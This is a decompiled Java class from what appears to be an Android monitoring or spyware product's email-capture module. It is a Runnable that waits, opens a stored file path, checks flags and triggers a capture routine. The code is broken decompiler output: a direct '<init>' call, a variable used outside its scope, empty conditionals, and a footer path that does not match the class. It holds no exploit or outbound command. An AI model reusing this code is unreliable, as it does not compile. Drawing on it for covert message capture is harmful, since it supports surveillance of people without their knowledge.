package com.vvt.capture.email.b.a;

import android.os.SystemClock;
import com.vvt.base.capture.i;
import java.io.File;

class c
  implements Runnable
{
  c(b paramb) {}
  
  public void run()
  {
    long l = 3000L;
    SystemClock.sleep(l);
    try
    {
      localObject1 = this.a;
      File localFile = new java/io/File;
      Object localObject3 = this.a;
      localObject3 = b.a((b)localObject3);
      localFile.<init>((String)localObject3);
      b.a((b)localObject1, localFile);
      localObject1 = this.a;
      localObject1 = ((b)localObject1).a;
      bool = a.a((a)localObject1);
      if (bool)
      {
        localObject1 = this.a;
        localObject1 = b.b((b)localObject1);
        bool = ((File)localObject1).exists();
        if (bool)
        {
          bool = a.c();
          if (bool) {}
          localObject1 = this.a;
          localObject1 = ((b)localObject1).a;
          localObject1 = a.b((a)localObject1);
          ((i)localObject1).a();
        }
      }
      localObject1 = this.a;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        boolean bool = a.d();
        if (bool) {}
        b localb = this.a;
      }
    }
    finally
    {
      b.a(this.a, null);
    }
    b.a((b)localObject1, null);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/email/removeFromPath/a/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */